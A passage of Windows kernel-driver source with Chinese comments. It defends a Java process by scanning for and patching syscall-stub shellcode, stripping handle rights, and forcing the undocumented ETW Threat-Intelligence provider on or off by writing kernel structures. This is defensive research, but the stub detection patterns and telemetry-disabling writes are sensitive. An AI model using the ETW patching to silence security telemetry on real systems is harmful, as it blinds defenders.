                                    break;
                                }
                            }
                        }
                    }
                    __except (EXCEPTION_EXECUTE_HANDLER)
                    {
                        exempt = FALSE;
                    }
                }
            }
            if (exempt)
                continue;

            // ⚠ 不改代码缓存页保护: JDK20 代码缓存永久 RWX (os_windows.cpp:3476),
            //   JVM 用纯指针写直接改代码缓存 (nativeInst_x86.hpp:86), 改 RX 会崩 JVM。
            //   详见 tzd_sc_scan_shellcode 注释。命中 stub 时用字节覆写 ud2, 不动页保护。
            BOOLEAN isCodeCache = (mbi.AllocationBase &&
                                   (PUCHAR)mbi.AllocationBase != regionBase) ||
                                  (regionSize >= 0x1000000);

            // 扫描该区段找 0F 05 (syscall), 页粒度读 (MmCopyVirtualMemory 跨进程安全读)
            PUCHAR p = regionBase;
            PUCHAR end = regionBase + regionSize;
            while (p + 2 <= end)
            {
                PUCHAR pageEnd = (PUCHAR)(((ULONG_PTR)p | 0xFFF) + 1);
                if (pageEnd > end)
                    pageEnd = end;
                SIZE_T chunk = (SIZE_T)(pageEnd - p);
                if (chunk > sizeof(pageBuf))
                    chunk = sizeof(pageBuf);
                SIZE_T got = 0;
                NTSTATUS r = MmCopyVirtualMemory(eproc, p, selfProc, pageBuf, chunk,
                                                 0 /*KernelMode*/, &got);
                if (NT_SUCCESS(r) && got >= 2)
                {
                    BOOLEAN hit = FALSE;
                    ULONG_PTR hitVa = 0;
                    // 直接 syscall 桩: mov eax,<ssn>(B8 imm32); syscall(0F 05)。JIT 不含此序列
                    //   (Java 走 call 进 native, 不在 JIT 里直接发 syscall) → 不误杀 JIT。
                    for (SIZE_T i = 0; i + 2 <= got && !hit; i++)
                    {
                        if (i >= 5 && pageBuf[i - 5] == 0xB8 && pageBuf[i] == 0x0F && pageBuf[i + 1] == 0x05)
                        {
                            hit = TRUE;
                            hitVa = (ULONG_PTR)p + i;
                        }
                    }
                    // 间接 syscall 桩: mov eax,<ssn> 后跳进 ntdll 的 0F 05 (自身无 0F 05)
                    //   (SysWhispers3 indirect: 自己设 SSN, 跳 ntdll 现成 syscall 指令)
                    if (!hit && got >= 6)
                        hit = tzd_sc_indirect_hit(eproc, selfProc, p, pageBuf, got, FALSE, &hitVa);
                    if (hit)
                    {
                        result->Hits++;
                        DbgPrint("[tzd] syscall stub (direct/indirect) pid=%lu va=0x%llx region=0x%llx size=0x%llx — neutralizing\n",
                                 (ULONG)(ULONG_PTR)g_MonitorPid, (unsigned long long)hitVa,
                                 (unsigned long long)(ULONG_PTR)regionBase,
                                 (unsigned long long)regionSize);
                        // 所有命中: ud2 覆写 (不动页保护; 整页 NX 会误杀同页 JIT 代码 → DEP 崩)
                        UCHAR ud2[2] = {0x0F, 0x0B};
                        SIZE_T wr = 0;
                        NTSTATUS ws = MmCopyVirtualMemory(selfProc, ud2, eproc, (PVOID)hitVa,
                                                          2, 0 /*KernelMode*/, &wr);
                        if (NT_SUCCESS(ws) && wr == 2)
                            result->NxBlocked++;
                    }
                }
                p = pageEnd;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        // 整体保护: 任何异常都不蓝屏
    }
    ZwClose(hProc);
    ObDereferenceObject(eproc);
    DbgPrint("[tzd] scan done pid=%lu hits=%lu nxBlocked=%lu\n",
             (ULONG)(ULONG_PTR)g_MonitorPid, result->Hits, result->NxBlocked);
    return STATUS_SUCCESS;
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 事件驱动进程保护 (ObRegisterCallbacks) ─────────────────────────────
//   不检测"怎么调用"(扫描 0F05 会崩/可绕过/有 TOCTOU), 而是在内核对象管理器
//   拦"调用者要对被保护进程做什么": 无论 direct/indirect syscall 还是走 ntdll,
//   只要 OpenProcess/DuplicateHandle 拿被保护进程的句柄, Pre-Operation 回调
//   必触发 → 裁剪 DesiredAccess 的危险位 (VM_READ/WRITE/OPERATION/TERMINATE/
//   DUP_HANDLE...) → 调用者拿到一个只有查询权限的"废句柄", 后续 ReadProcessMemory/
//   TerminateProcess 等干净失败 (ACCESS_DENIED), 被保护进程照常运行, 不崩。
// ═══════════════════════════════════════════════════════════════════════

// 句柄创建前回调: 裁剪他人对被保护进程的危险权限
static OB_PREOP_CALLBACK_STATUS tzd_PreOpProcess(PVOID ctx, POB_PRE_OPERATION_INFORMATION op)
{
    UNREFERENCED_PARAMETER(ctx);
    ULONG protPid = (ULONG)g_ProtectedPid;
    if (protPid == 0)
        return OB_PREOP_SUCCESS;

    PEPROCESS tgt = (PEPROCESS)op->Object;
    HANDLE tgtPid = PsGetProcessId(tgt);
    if ((ULONG)(ULONG_PTR)tgtPid != protPid)
        return OB_PREOP_SUCCESS; // 不是被保护进程 → 放行

    // 豁免自身: 被保护进程自己打开自己 (seckill_mod 要能继续操作自己) → 放行
    PEPROCESS self = PsGetCurrentProcess();
    if (PsGetProcessId(self) == tgtPid)
        return OB_PREOP_SUCCESS;

    // 裁剪危险权限 (保留查询类, 让调用者拿到无害句柄而非被拒, 避免调用者异常)
    op->Parameters->CreateHandleInformation.DesiredAccess &=
        ~(0x0010 /*VM_READ*/ | 0x0020 /*VM_WRITE*/ | 0x0008 /*VM_OPERATION*/
          | 0x0001 /*TERMINATE*/ | 0x0040                   /*DUP_HANDLE*/
          | 0x0080 /*CREATE_PROCESS*/ | 0x0002              /*CREATE_THREAD*/
          | 0x0020 /*SET_INFORMATION*/ | 0x0100             /*SET_QUOTA*/
          | 0x0004 /*SUSPEND_RESUME*/);
    DbgPrint("[tzd] PROTECT: stripped handle rights from pid=%lu targeting protected pid=%lu\n",
             (ULONG)(ULONG_PTR)PsGetProcessId(self), protPid);
    return OB_PREOP_SUCCESS;
}

static NTSTATUS tzd_arm_protect(ULONG pid)
{
    // 已 armed → 只更新 PID
    if (g_ObRegHandle)
    {
        InterlockedExchange(&g_ProtectedPid, (LONG)pid);
        DbgPrint("[tzd] protect retargeted to pid=%lu\n", pid);
        return STATUS_SUCCESS;
    }
    OB_OPERATION_REGISTRATION opReg = {0};
    opReg.ObjectType = PsProcessType; // 字段是 POBJECT_TYPE* (不 deref)
    opReg.Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_OPEN;
    opReg.PreOperation = tzd_PreOpProcess;
    opReg.PostOperation = NULL;

    OB_CALLBACK_REGISTRATION reg = {0};
    reg.Version = OB_FLT_REGISTRATION_VERSION;
    reg.OperationRegistrationCount = 1;
    reg.OperationRegistration = &opReg;
    UNICODE_STRING alt;
    RtlInitUnicodeString(&alt, L"329987.5");
    reg.Altitude = alt;
    reg.RegistrationContext = NULL;

    NTSTATUS st = ObRegisterCallbacks(&reg, &g_ObRegHandle);
    if (!NT_SUCCESS(st))
    {
        DbgPrint("[tzd] ObRegisterCallbacks failed status=0x%lx\n", st);
        return st;
    }
    InterlockedExchange(&g_ProtectedPid, (LONG)pid);
    DbgPrint("[tzd] protect armed for pid=%lu (ObRegisterCallbacks ok)\n", pid);
    return STATUS_SUCCESS;
}

static void tzd_disarm_protect(void)
{
    if (g_ObRegHandle)
    {
        ObUnRegisterCallbacks(g_ObRegHandle);
        g_ObRegHandle = NULL;
        InterlockedExchange(&g_ProtectedPid, 0);
        DbgPrint("[tzd] protect disarmed\n");
    }
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 反 Shellcode 防御 (针对指定 Java 进程: 允许 JIT / 严格阻断 shellcode) ─
//   目标: 被武装进程(典型 java.exe)允许其 JIT 编译(匿名 RX 代码), 但中和任何真正
//   的 shellcode 与"篡改 JIT 实现的 shellcode"。
//
//   为什么不用 PsSetCreateThreadNotifyRoutineEx(Ex 变体可读 StartAddress 并阻断线程)?
//   — 其 per-thread info 结构(PS_CREATE_THREAD_NOTIFY_INFO)未在任何公共 WDK 头中声明
//   (已核对 ntddk.h / ntifs.h 及 28000 / 26100 两版 WDK)。用未文档化结构在 Windows
//   版本错位时会读写错位字段 → BSOD, 违背"绝不 BSOD"原则。故改用已声明的非 Ex 变体
//   (检测) + 周期 NX 中和(阻断), 安全等价达成"阻断非法线程/上下文劫持": shellcode
//   代码页被改非执行后, 线程一执行即 #PF 被阻断。
//
//   四阶段防御(用户要求):
//   ① 内存生成阶段: 监控 RWX/RX 动态分配 — 周期 VAD 扫描(ZwQueryVirtualMemory 属性
//      校验), 命中 shellcode 特征即 NX。(ETW-TI 的 NtAllocateVirtualMemory 实时拦截为
//      MS EDR 保留, 第三方驱动不可安全订阅; VAD 周期扫描为 BSOD 安全替代。)
//   ② 执行触发阶段: 阻断非法线程/上下文劫持 — PsSetCreateThreadNotifyRoutine 检测被
//      武装进程新线程 → 触发扫描线程即时中和; shellcode 代码 NX 后线程执行即 #PF。
//   ③ 权限篡改阶段: 监控 VirtualProtect 逆向改可执行 — 周期扫描发现匿名可执行区段含
//      shellcode 特征(含被翻成 RWX 的数据页) → NX。现代 JIT 用 RX 不用 RWX, 故匿名
//      RWX 是强 shellcode 指标; 但仍以特征二次确认, 不误杀干净 JIT。
//   ④ 模块注入阶段: 阻断无文件 PE 映射 — 周期扫描发现匿名可执行区段起始页为 'MZ'
//      (手动映射 PE) → 整段 NX; PsSetLoadImageNotifyRoutine 对加载到被武装进程的镜像
//      做签名校验(ImageSignatureType), 无签名镜像告警。
//   全程仅用文档化内核 API(ntddk.h/wdm.h); 跨进程内存操作 __try/__except 包裹 → 不 BSOD。
// ═══════════════════════════════════════════════════════════════════════

// 反 shellcode 扫描: 中和被武装进程匿名可执行内存中的 shellcode。
// 允许 JIT 原则: 干净 JIT(匿名 RX, 无 shellcode 特征) 原样保留; 仅中和有特征的区段。
// 注: 仅由扫描工作线程调用(单线程, 复用全局 g_ScPageBuf, 无并发)。
static void tzd_sc_scan_shellcode(HANDLE pid)
{
    if (!pid)
        return;
    if (!g_ZwQueryVirtualMemory || !g_ZwProtectVirtualMemory)
        return;

    PEPROCESS eproc = NULL;
    NTSTATUS st = PsLookupProcessByProcessId(pid, &eproc);
    if (!NT_SUCCESS(st))
        return;

    // 内核句柄(0x80000000=OBJ_KERNEL_HANDLE) — 跨进程查询/改保护用
    HANDLE hProc = NULL;
    st = ObOpenObjectByPointer(eproc, 0x80000000, NULL,
                               0x001F0FFF /*PROCESS_ALL_ACCESS*/, *PsProcessType,
                               0 /*KernelMode*/, &hProc);
    if (!NT_SUCCESS(st))
    {
        ObDereferenceObject(eproc);
        return;
    }

    PEPROCESS selfProc = PsGetCurrentProcess();

    __try
    {
        TZD_MEMORY_BASIC_INFORMATION mbi;
        PUCHAR addr = (PUCHAR)0x10000ULL; // 从 64KB 起扫 (跳过低页)
        PUCHAR userMax = (PUCHAR)0x00007FFFFFFFFFFFULL;
        while (addr < userMax)
        {
            SIZE_T ret = 0;
            NTSTATUS q = g_ZwQueryVirtualMemory(hProc, addr, 0 /*MemoryBasicInformation*/,
                                                &mbi, sizeof(mbi), &ret);
            if (!NT_SUCCESS(q) || mbi.RegionSize == 0)
                break;
            PUCHAR regionBase = (PUCHAR)mbi.BaseAddress;
            SIZE_T regionSize = mbi.RegionSize;
            addr = regionBase + regionSize; // 推进到下一区段

            if (mbi.State != MEM_COMMIT)
                continue; // 只扫已提交
            if (!(mbi.Protect & 0xF0 /*PAGE_EXECUTE_* */))
                continue; // 只扫可执行
            if (mbi.Type == 0x1000000 /*MEM_IMAGE*/)
            {
                // 捕获 ntdll 可执行区范围 (供间接 syscall 检测; 仅一次)
                if (!g_NtdllBase)
                {
                    UCHAR nameBuf[520];
                    SIZE_T nr = 0;
                    NTSTATUS nq = g_ZwQueryVirtualMemory(hProc, regionBase,
                                                         2 /*MemoryMappedFilenameInformation*/,
                                                         nameBuf, sizeof(nameBuf), &nr);
                    if (NT_SUCCESS(nq) && nr >= sizeof(UNICODE_STRING))
                    {
                        PUNICODE_STRING un = (PUNICODE_STRING)nameBuf;
                        __try
                        {
                            if (un->Buffer && un->Length && tzd_name_endswith_ci(un, L"ntdll.dll"))
                            {
                                g_NtdllBase = (ULONG64)regionBase;
                                g_NtdllSize = regionSize;
                            }
                        }
                        __except (EXCEPTION_EXECUTE_HANDLER)
                        {
                        }
                    }
                }
                continue; // file-backed 镜像跳过(签名 DLL/exe)
            }

            // 匿名可执行区段 = JIT 代码 或 shellcode。仅当出现 shellcode 特征才中和:

            // ④ 无文件 PE: 区段起始页为 'MZ'(4D 5A) → 整段中和
            SIZE_T firstChunk = (regionSize < sizeof(g_ScPageBuf)) ? regionSize : sizeof(g_ScPageBuf);
            SIZE_T got0 = 0;
            NTSTATUS r0 = MmCopyVirtualMemory(eproc, regionBase, selfProc, g_ScPageBuf,
                                              firstChunk, 0 /*KernelMode*/, &got0);
            if (NT_SUCCESS(r0) && got0 >= 2 && g_ScPageBuf[0] == 0x4D && g_ScPageBuf[1] == 0x5A)
            {
                PUCHAR nxBase = regionBase;
                SIZE_T nxSize = regionSize;
                ULONG oldProt = 0;
                NTSTATUS ps = g_ZwProtectVirtualMemory(hProc, &nxBase, &nxSize,
                                                       0x04 /*PAGE_READWRITE*/, &oldProt);
                if (NT_SUCCESS(ps))
                {
                    InterlockedIncrement(&g_ScFilelessPe);
                    InterlockedExchangeAdd(&g_ScPagesNx, (LONG)(nxSize >> 12));
                    InterlockedExchange(&g_ScCompromised, 1);
                    InterlockedExchange(&g_ScLastShellcodeType, 4);
                    InterlockedExchange64((LONG64 *)&g_ScLastShellcodeVa, (LONG64)(ULONG_PTR)regionBase);
                    DbgPrint("[tzd] SC: fileless-PE(MZ) @0x%llx size=0x%llx pid=%lu NX'd\n",
                             (unsigned long long)(ULONG_PTR)regionBase,
                             (unsigned long long)regionSize, (ULONG)(ULONG_PTR)pid);
                }
                continue; // 整段已处理
            }

            // 代码缓存判定: AllocationBase≠区段基址(大保留内的子提交) 或 区段≥1MB → JIT 代码缓存
            //   (原 16MB 阈值太宽: HotSpot 代码缓存首段可能 AllocationBase==regionBase 且 <16MB
            //    → 被误判为非代码缓存 → 整段 NX 误杀 JVM。1MB 更贴合 HotSpot 段大小)
            BOOLEAN isCodeCache = (mbi.AllocationBase &&
                                   (PUCHAR)mbi.AllocationBase != regionBase) ||
                                  (regionSize >= 0x100000);

            // ⚠ 不改代码缓存页保护 (RWX→RX 会崩 JVM):
            //   JDK20 (os_windows.cpp:3476) 代码缓存永久 PAGE_EXECUTE_READWRITE — 先 commit
            //   PAGE_READWRITE 再 VirtualProtect 升级 RWX, 从不变 RX。JVM 用 set_int_at() /
            //   disarm()/arm() / set_destination_mt_safe() 等 *纯指针写* 直接改代码缓存
            //   (nativeInst_x86.hpp:86 *(jint*)addr_at(offset)=i), 不调 VirtualProtect。
            //   改 RX → 这些直接写即 #PF → JVM 崩 (IC patching / nmethod entry barrier)。
            //   且页面保护层无法区分 JVM 合法写 vs bypass Unsafe.putByte 攻击写 — 两者都往
            //   RWX 页直接写。正确中和方式: 覆写 stub 字节为 ud2(0F0B), 不动页保护, 不误杀同页 JIT。
            //   (唯一能区分"谁在写"的是写者 RIP/模块归属, 须 ETW-TI MEM_WRITE 或 systrace RIP 检查。)

            // ❌ 不再整段 NX 非 code-cache RWX 区段 (原逻辑误杀 JVM):
            //   JDK20 代码缓存永久 RWX (os_windows.cpp:3476); isCodeCache 启发式无法 100%
            //   区分 JIT 代码缓存 vs 注入 shellcode — 两者都是匿名 RWX 可执行。整段 NX 会误杀
            //   JVM (JIT 代码无法执行 → 崩 → compromised → kill 0x5C)。
            //   改为: 不因 RWX 就 NX, 只在逐页扫中实际 syscall stub (B8 imm32 0F 05 / 间接跳
            //   ntdll 0F 05) 时才精确中和 (代码缓存: ud2 覆写; 其他: NX 单页)。

            // ①③ 执行类 shellcode: 逐页扫真正直接 syscall 桩 (mov eax,<ssn>; syscall =
            //    B8 ?? ?? ?? ?? 0F 05)。含 JIT 被篡改插入的 syscall → 命中页 NX。
            //    干净 JIT (含 Inflater.needsInput 等) 不含此序列 → 保留, 不误杀
            //    (旧版裸扫 0F 05 会把 JIT 页里巧合的 0F 05 字节当 gadget → NX → 执行 #PF 崩 JVM)。
            PUCHAR p = regionBase;
            PUCHAR end = regionBase + regionSize;
            while (p + 2 <= end)
            {
                PUCHAR pageEnd = (PUCHAR)(((ULONG_PTR)p | 0xFFF) + 1);
                if (pageEnd > end)
                    pageEnd = end;
                SIZE_T chunk = (SIZE_T)(pageEnd - p);
                if (chunk > sizeof(g_ScPageBuf))
                    chunk = sizeof(g_ScPageBuf);
                SIZE_T got = 0;
                NTSTATUS rr = MmCopyVirtualMemory(eproc, p, selfProc, g_ScPageBuf,
                                                  chunk, 0, &got);
                if (NT_SUCCESS(rr) && got >= 2)
                {
                    BOOLEAN hit = FALSE;
                    ULONG_PTR stubVa = 0;
                    // 直接 syscall 桩: B8 <imm32> 0F 05 (mov eax,<ssn>; syscall)。JIT 不含。
                    for (SIZE_T i = 0; i + 2 <= got && !hit; i++)
                    {
                        if (i >= 5 && g_ScPageBuf[i - 5] == 0xB8 &&
                            g_ScPageBuf[i] == 0x0F && g_ScPageBuf[i + 1] == 0x05)
                        {
                            hit = TRUE;
                            stubVa = (ULONG_PTR)p + i;
                        }
                    }
                    if (!hit && got >= 6)
                    {
                        if (isCodeCache)
                        {
                            // 代码缓存: 仅锚版间接 (省 FF 解引用; JIT 不跳 ntdll 0F 05 → 锚版够)
                            hit = tzd_sc_indirect_hit(eproc, selfProc, p, g_ScPageBuf, got, FALSE, &stubVa);
                        }
                        else
                        {
                            // 非代码缓存 (小独立 shellcode 区): 抗混淆 — 窗口直接 + 无锚间接
                            hit = tzd_sc_windowed_direct(p, g_ScPageBuf, got, &stubVa);
                            if (!hit)
                                hit = tzd_sc_indirect_hit(eproc, selfProc, p, g_ScPageBuf, got, TRUE, &stubVa);
                        }
                    }
                    if (hit)
                    {
                        // 所有命中: 覆写 stub 的 0F 05 为 ud2(0F 0B) — 不动页保护!
                        //   isCodeCache 启发式无法 100% 区分 JIT 代码缓存 vs shellcode;
                        //   整页 NX (PAGE_READWRITE) 会误杀同页 JIT 代码 → JVM DEP violation 崩。
                        //   ud2 覆写只杀 stub 的 0F 05 那 2 字节, 同页其他 JIT 代码不受影响。
                        //   MmCopyVirtualMemory 跨进程写: selfProc→eproc (kernel→target)。
                        {
                            UCHAR ud2[2] = {0x0F, 0x0B};
                            SIZE_T wr = 0;
                            NTSTATUS ws = MmCopyVirtualMemory(selfProc, ud2, eproc, (PVOID)stubVa,
                                                              2, 0 /*KernelMode*/, &wr);
                            if (NT_SUCCESS(ws) && wr == 2)
                            {
                                InterlockedIncrement(&g_ScPagesNx);
                                InterlockedExchange(&g_ScCompromised, 1);
                                InterlockedExchange(&g_ScLastShellcodeType, 1);
                                InterlockedExchange64((LONG64 *)&g_ScLastShellcodeVa, (LONG64)stubVa);
                                DbgPrint("[tzd] SC: stub @0x%llx pid=%lu → ud2'd (page prot untouched; isCodeCache=%d)\n",
                                         (unsigned long long)stubVa, (ULONG)(ULONG_PTR)pid, isCodeCache ? 1 : 0);
                            }
                        }
                    }
                }
                p = pageEnd;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        // 整体保护: 任何异常都不蓝屏
    }
    ZwClose(hProc);
    ObDereferenceObject(eproc);
}

// ② 线程创建通知(非 Ex 变体: 仅文档化, 无签名要求, 不用未文档结构)
//   检测被武装进程的新线程 → 计数 (扫描线程会中和其 shellcode 代码)
static VOID tzd_sc_ThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create)
{
    UNREFERENCED_PARAMETER(ThreadId);
    if (!Create)
        return; // 只关心创建
    ULONG armedPid = (ULONG)g_ScArmedPid;
    if (armedPid == 0)
        return; // 未武装 → 放行 (快路径)
    if ((ULONG)(ULONG_PTR)ProcessId != armedPid)
        return; // 只针对被武装进程
    InterlockedIncrement(&g_ScThreadsSeen);
    DbgPrint("[tzd] SC: new thread tid=%lu in armed pid=%lu (周期扫描将中和 shellcode)\n",
             (ULONG)(ULONG_PTR)ThreadId, armedPid);
    // 不内联扫描: 阻塞线程创建路径有死锁风险 → 交由扫描线程下一拍中和
}

// ④ 镜像加载通知: 对加载到被武装进程的镜像做签名校验 (无签名 → 告警)
//   file-backed 镜像本身即磁盘文件 → "磁盘文件"校验天然满足; 签名校验在此。
//   加载回调是信息性的, 不在此中和; 真正中和交给周期扫描的匿名区段 NX。
static VOID tzd_sc_LoadImageNotify(PUNICODE_STRING FullImageName, HANDLE ProcessId, PIMAGE_INFO ImageInfo)
{
    if (!ImageInfo)
        return;
    ULONG armedPid = (ULONG)g_ScArmedPid;
    if (armedPid == 0)
        return; // 未武装 → 放行 (快路径)
    if (ProcessId == 0)
        return; // 0 = 系统全局映射, 跳过
    if ((ULONG)(ULONG_PTR)ProcessId != armedPid)
        return;
    InterlockedIncrement(&g_ScImagesSeen);

    // 签名校验: ImageSignatureType 3bit (0=None,1=Embedded,2=Cache,3=PageHash...)
    if (ImageInfo->ImageSignatureType == 0)
    {
        InterlockedIncrement(&g_ScUnsignedImgs);
        if (FullImageName && FullImageName->Buffer && FullImageName->Length)
        {
            DbgPrint("[tzd] SC: UNSIGNED image base=0x%llx size=0x%llx pid=%lu name=%wZ\n",
                     (unsigned long long)(ULONG_PTR)ImageInfo->ImageBase,
                     (unsigned long long)ImageInfo->ImageSize, armedPid, FullImageName);
        }
        else
        {
            DbgPrint("[tzd] SC: UNSIGNED image base=0x%llx size=0x%llx pid=%lu (no name)\n",
                     (unsigned long long)(ULONG_PTR)ImageInfo->ImageBase,
                     (unsigned long long)ImageInfo->ImageSize, armedPid);
        }
    }
}

// ★ 前向声明: tzd_jit_integrity_scan 定义在 tzd_is_jit_code 之后
static void tzd_jit_integrity_scan(HANDLE pid);

// 周期扫描工作线程 (500ms 一拍): 中和被武装进程的匿名可执行 shellcode。
// 线程在首次武装时创建并常驻 (重新武装只改 PID); 卸载时 tzd_sc_shutdown 停止并回收。
static VOID tzd_sc_ScannerThread(PVOID StartContext)
{
    UNREFERENCED_PARAMETER(StartContext);
    // 自引用当前线程对象: 供 tzd_sc_shutdown 等待退出 + 释放。无 ObReferenceObjectByHandle
    // 失败路径; 线程 terminate 后对象因仍有此 ref 不立即释放, 直到 shutdown ObDereference。
    g_ScThreadObj = PsGetCurrentThread();
    ObReferenceObject(g_ScThreadObj);

    LARGE_INTEGER timeout;
    timeout.QuadPart = -5000000LL; // 500ms (100ns 单位, 负=相对)
    for (;;)
    {
        if (g_Unloading)
            break;
        HANDLE pid = (HANDLE)(ULONG_PTR)g_ScArmedPid;
        if (pid)
        {
            __try
            {
                // ① shellcode 扫描 (匿名可执行区段: syscall 桩 / 无文件 PE)
                tzd_sc_scan_shellcode(pid);
                // ② JIT 代码缓存完整性校验 (Unsafe.putByte 从 jvm.dll 写 → 内容校验捕获)
                //   用 tzd_is_jit_code + XOR 校验和区分合法 JIT 补丁 vs 恶意篡改
                tzd_jit_integrity_scan(pid);
                InterlockedIncrement(&g_ScScans);
            }
            __except (EXCEPTION_EXECUTE_HANDLER)
            {
                // 单拍扫描异常不致命, 继续下一拍
            }
        }
        // 等 stop event: 信号即 (下一轮) 退出, 否则 500ms 超时下一拍
        KeWaitForSingleObject(&g_ScStopEvent, Executive, KernelMode, FALSE, &timeout);
    }
    PsTerminateSystemThread(STATUS_SUCCESS);
}

// ═══════════════════════════════════════════════════════════════════════
// ─── ETW-TI 主方案 (PPL 式内核写: 强制 ThreatInt provider 发射) ────────────
//   逆向 EtwProviderEnabled/KeInsertQueueApc: TI 发射由 EtwProviderEnabled(EtwThreatIntProvRegHandle,
//   level, keyword) 门控 → 它查 reg-entry→[+0x20]=GuidEntry 的 [+0x60 count]/[+0x64 level]/[+0x68 flags]
//   /[+0x70 kwmask1]/[+0x78 kwmask2]。强制启用 = kwmask 全开 + (count==0 才置 1) → 返 true →
//   所有 EtwTiLog*(NtAllocateVirtualMemory/NtProtectVirtualMemory/Map/Context/...) 全发射。
//
//   定位 EtwThreatIntProvRegHandle(未导出): 该全局被内联进 KeInsertQueueApc(已导出) 的
//   EtwTiLogInsertQueueUserApc 引用为 `mov r10,[rip+disp32]`(4C 8B 15)。扫 KeInsertQueueApc 的
//   (48|4C) 8B + RIP 相对 mov, 逐个解引用: target→reg-entry→[+0x20] GuidEntry, 在 GuidEntry
//   [0..0x200] 内匹配 ThreatIntProviderGuid 原始 16 字节确认 (不依赖"默认禁用", 故 ThreatInt
//   已被 Defender 等启用时也能命中)。命中即写。
//
//   仅数据写(非代码补丁): PG 不护 ETW reg-entry; 写均对齐非分页内核指针原子写, 全程
//   __try → 非法地址回退而非 #PF → 蓝屏。失败/不支持 → 调用方回退周期扫描(始终在跑的
//   内核中和器)。注: 这强制"发射"; TI 事件流到 ETW 会话(用户态 consumer 读), 故主方案
//   供"已起实时会话的用户态 consumer"取事件, 内核中和仍由周期扫描承担。
// ═══════════════════════════════════════════════════════════════════════
static NTSTATUS tzd_etwti_resolve_and_enable(void)
{
    if (g_EtwTiEnabled)
        return STATUS_SUCCESS; // 已启用 (幂等)

    // 锚点: KeInsertQueueApc (已导出, 内联了引用 ThreatInt reg-handle 的 TI 日志)
    UNICODE_STRING name;
    RtlInitUnicodeString(&name, L"KeInsertQueueApc");
    PUCHAR fn = (PUCHAR)MmGetSystemRoutineAddress(&name);
    if (!fn)
    {
        DbgPrint("[tzd] ETW-TI: KeInsertQueueApc 未找到\n");
        return STATUS_NOT_FOUND;
    }

    // 扫前 0x4000 字节: (48|4C) 8B <modrm (modrm&0xC7)==0x05> = mov r64,[rip+disp32]
    // (REX.W 或 REX.WR; mod=00 r/m=101 → RIP 相对; reg 任意 — 含 r10 等 r8-r15)
    for (SIZE_T i = 0; i + 7 <= 0x4000; i++)
    {
        UCHAR p0 = fn[i], p1 = fn[i + 1];
        if (!((p0 == 0x48 || p0 == 0x4C) && p1 == 0x8B))
            continue;
        if ((fn[i + 2] & 0xC7) != 0x05)
            continue;
        LONG disp = *(LONG *)(fn + i + 3);
        PUCHAR target = (PUCHAR)(&fn[i]) + 7 + disp; // &EtwThreatIntProvRegHandle
        PVOID regEntry = NULL;                       // 全局值 = reg-entry 指针
        __try
        {
            regEntry = *(PVOID *)target;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            continue;
        }
        if ((ULONG_PTR)regEntry < 0xFFFF800000000000ULL)
            continue;    // 必须内核指针
        PVOID ge = NULL; // GuidEntry = reg-entry→[+0x20]
        __try
        {
            ge = *(PVOID *)((PUCHAR)regEntry + ETWTI_REGENTRY_GUIDENTRY_OFS);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            continue;
        }
        if ((ULONG_PTR)ge < 0xFFFF800000000000ULL)
            continue;
        // 用 ThreatIntProviderGuid 原始 16 字节在 GuidEntry[0..0x200] 匹配确认 (不依赖禁用态)
        UCHAR gbuf[0x200];
        __try
        {
            RtlCopyMemory(gbuf, ge, sizeof(gbuf));
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            continue;
        }
        BOOLEAN isTi = FALSE;
        for (SIZE_T j = 0; j + 16 <= sizeof(gbuf); j++)
        {
            BOOLEAN eq = TRUE;
            for (int k = 0; k < 16; k++)
                if (gbuf[j + k] != g_ThreatIntGuid[k])
                {
                    eq = FALSE;
                    break;
                }
            if (eq)
            {
                isTi = TRUE;
                break;
            }
        }
        if (!isTi)
            continue; // 非 ThreatInt → 跳过

        // 命中 ThreatInt。读当前 count (可能被 Defender 等启用 → count≠0)
        ULONG count = 0;
        __try
        {
            count = *(volatile ULONG *)((PUCHAR)ge + ETWTI_GE_COUNT_OFS);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            continue;
        }

        BOOLEAN ok = FALSE;
        __try
        {
            // 拓宽到全关键字: kwmask1=全1, kwmask2=0(任意关键字过), level=0xFF, flags|=0x40
            *(volatile ULONG64 *)((PUCHAR)ge + ETWTI_GE_KWMASK1_OFS) = 0xFFFFFFFFFFFFFFFFULL;
            *(volatile ULONG64 *)((PUCHAR)ge + ETWTI_GE_KWMASK2_OFS) = 0;
            *(volatile UCHAR *)((PUCHAR)ge + ETWTI_GE_LEVEL_OFS) = 0xFF;
            *(volatile ULONG *)((PUCHAR)ge + ETWTI_GE_FLAGS_OFS) = 0x40;
            // 仅当前禁用(count==0)才置 count=1 激活; 已启用(如 Defender)则不扰动会话计数
            if (count == 0)
                *(volatile ULONG *)((PUCHAR)ge + ETWTI_GE_COUNT_OFS) = 1;
            ok = TRUE;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            ok = FALSE;
        }
        if (!ok)
        {
            DbgPrint("[tzd] ETW-TI: 写 GuidEntry 异常 → 回退周期扫描\n");
            return STATUS_ACCESS_DENIED;
        }

        g_EtwThreatIntRegHandleAddr = (PVOID)target;
        g_EtwTiGuidEntry = ge;
        InterlockedExchange(&g_EtwTiEnabled, 1);
        DbgPrint("[tzd] ETW-TI: 强制启用成功 regHandle@%p guidEntry=%p countWas=%lu\n", target, ge, count);
        return STATUS_SUCCESS;
    }
    DbgPrint("[tzd] ETW-TI: 未在 KeInsertQueueApc 定位 ThreatInt reg-handle → 回退周期扫描\n");
    return STATUS_NOT_FOUND;
}

// 关闭 ETW-TI 发射 (置 enable count=0 → EtwProviderEnabled 走 [+0x65] 非 premium 路径 → 不发射)
// 注: 若 ThreatInt 原被 Defender 等启用, disarm 会一并停发 (VM/研究用途, 重启恢复)。
static void tzd_etwti_disable(void)
{
    if (!g_EtwTiGuidEntry)
    {
        InterlockedExchange(&g_EtwTiEnabled, 0);
        return;
    }
    __try
    {
        *(volatile ULONG *)((PUCHAR)g_EtwTiGuidEntry + ETWTI_GE_COUNT_OFS) = 0;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
    }
    InterlockedExchange(&g_EtwTiEnabled, 0);
